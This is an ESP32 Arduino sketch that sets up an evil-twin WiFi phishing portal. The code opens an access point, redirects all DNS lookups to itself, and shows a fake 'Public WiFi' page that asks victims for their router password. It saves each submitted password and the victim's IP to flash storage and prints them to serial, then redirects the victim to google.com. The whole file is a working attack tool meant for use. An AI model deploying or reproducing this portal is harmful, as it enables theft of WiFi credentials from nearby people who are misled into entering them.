//made by muhamad jalal 404

#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <SPIFFS.h>

const char* AP_SSID = "IQtest fake lol";  // AP SSID
const byte DNS_PORT = 53;

DNSServer dnsServer;
WebServer server(80);

// captive portal login page (password only)
const char* loginPage = 
R"(
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Public WiFi Login</title>
  <style>
    :root {
      --primary-color: #4dabf7;  /* Light blue */
      --secondary-color: #40c057;  /* Fresh green */
      --success-color: #2ecc71;
      --text-color: #333;
      --light-gray: #f8f9fa;
      --white: #ffffff;
    }
    
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: linear-gradient(135deg, #f5f7fa 0%, #e3f2fd 100%);
      margin: 0;
      padding: 0;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      color: var(--text-color);
      line-height: 1.6;
    }
    
    .login-box {
      width: 380px;
      background: var(--white);
      margin: 20px;
      padding: 40px;
      border-radius: 12px;
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
      text-align: center;
      transition: transform 0.3s ease;
      border: 1px solid rgba(77, 171, 247, 0.2);
    }
    
    .login-box:hover {
      transform: translateY(-5px);
      box-shadow: 0 12px 35px rgba(0, 0, 0, 0.12);
    }
    
    .logo {
      margin-bottom: 25px;
      font-size: 24px;
      font-weight: 700;
      color: var(--primary-color);
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
    }
    
    .wifi-icon {
      width: 30px;
      height: 30px;
      position: relative;
    }
    
    .wifi-icon::before,
    .wifi-icon::after {
      content: '';
      position: absolute;
      border: 3px solid transparent;
      border-top-color: var(--primary-color);
      border-radius: 50%;
      animation: wifi 2s infinite;
    }
    
    .wifi-icon::before {
      width: 30px;
      height: 30px;
      top: 0;
      left: 0;
      animation-delay: 0.2s;
    }
    
    .wifi-icon::after {
      width: 20px;
      height: 20px;
      top: 5px;
      left: 5px;
      animation-delay: 0.4s;
    }
    
    .wifi-dot {
      width: 8px;
      height: 8px;
      background-color: var(--primary-color);
      border-radius: 50%;
      position: absolute;
      bottom: 0;
      left: 13px;
    }
    
    @keyframes wifi {
      0% { opacity: 0.4; }
      50% { opacity: 1; }
      100% { opacity: 0.4; }
    }
    
    .message {
      text-align: center;
      margin-bottom: 25px;
      color: #555;
      font-size: 15px;
      line-height: 1.5;
    }
    
    input {
      width: 100%;
      padding: 14px;
      margin: 10px 0;
      border: 1px solid #e0e0e0;
      border-radius: 8px;
      font-size: 15px;
      transition: all 0.3s ease;
      box-sizing: border-box;
    }
    
    input:focus {
      outline: none;
      border-color: var(--primary-color);
      box-shadow: 0 0 0 3px rgba(77, 171, 247, 0.1);
    }
    
    button {
      background: linear-gradient(to right, var(--primary-color), var(--secondary-color));
      color: var(--white);
      border: none;
      padding: 14px;
      width: 100%;
      border-radius: 8px;
      cursor: pointer;
      font-size: 16px;
      font-weight: 600;
      margin-top: 10px;
      transition: all 0.3s ease;
      box-shadow: 0 4px 15px rgba(77, 171, 247, 0.3);
    }
    
    button:hover {
      transform: translateY(-2px);
      box-shadow: 0 6px 20px rgba(77, 171, 247, 0.4);
      background: linear-gradient(to right, #3b9dec, #37b24d);
    }
    
    button:active {
      transform: translateY(0);
    }
    
    .security-note {
      font-size: 12px;
      color: #777;
      margin-top: 20px;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 5px;
    }
    
    .lock-icon {
      color: var(--secondary-color);
      font-size: 14px;
    }
  </style>
</head>
<body>
  <div class="login-box">
    <div class="logo">
      <div class="wifi-icon">
        <div class="wifi-dot"></div>
      </div>
      Public WiFi
    </div>
    <div class="message">dear customer, please enter the wifi password of your router to continue using internet</div>
    <form method="POST" action="/login">
      <input type="password" name="password" placeholder="Password " required>
      <button type="submit">Enter  </button>
    </form>
    <div class="security-note">
      <span class="lock-icon">🔒</span>
      © 2023 All rights are reserved muhamadjalal404.
    </div>
  </div>
</body>
</html>
)";

// Stores credentials to SPIFFS
void logCredentials(String password, String ip) {
  File file = SPIFFS.open("/creds.txt", FILE_APPEND);
  if (!file) {
    Serial.println("[!] Failed to open creds.txt");
    return;
  }
  file.print("TIME: "); file.println(millis() / 1000); // Convert to seconds
  file.print("IP: "); file.println(ip);
  file.print("PASSWORD: "); file.println(password);
  file.println("------------------");
  file.close();
}

// Handles form submission
void handleLogin() {
  if (server.method() != HTTP_POST) {
    server.send(405, "text/plain", "Method Not Allowed");
    return;
  }

  String password = server.arg("password");
  String clientIP = server.client().remoteIP().toString();

  // Log to serial monitor
  Serial.println("\n[+] Password Captured:");
  Serial.println("IP: " + clientIP);
  Serial.println("Password: " + password);

  // Save to SPIFFS
  logCredentials(password, clientIP);

  // Redirect to fake "success" page
  server.sendHeader("Location", "http://www.google.com", true);
  server.send(302, "text/plain", "Redirecting...");
}

void setup() {
  Serial.begin(115200);
  while (!Serial); // Wait for Serial Monitor (for debugging)

  // Initialize SPIFFS
  if (!SPIFFS.begin(true)) {
    Serial.println("[!] Failed to mount SPIFFS");
    while (1) delay(100); // Halt if SPIFFS fails
  }

  // Start AP
  WiFi.softAP(AP_SSID);
  Serial.println("[+] AP Started: " + String(AP_SSID));
  Serial.println("[+] AP IP: " + WiFi.softAPIP().toString());

  // DNS spoofing (redirect all traffic to portal)
  dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());

  // Serve login page
  server.on("/", []() {
    server.send(200, "text/html", loginPage);
  });

  // Handle form submission
  server.on("/login", HTTP_POST, handleLogin);

  // Redirect all other requests to portal
  server.onNotFound([]() {
    server.sendHeader("Location", "http://" + server.client().localIP().toString(), true);
    server.send(302, "text/plain", "Redirecting to captive portal...");
  });

  server.begin();
  Serial.println("[+] HTTP server started");
}

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();
}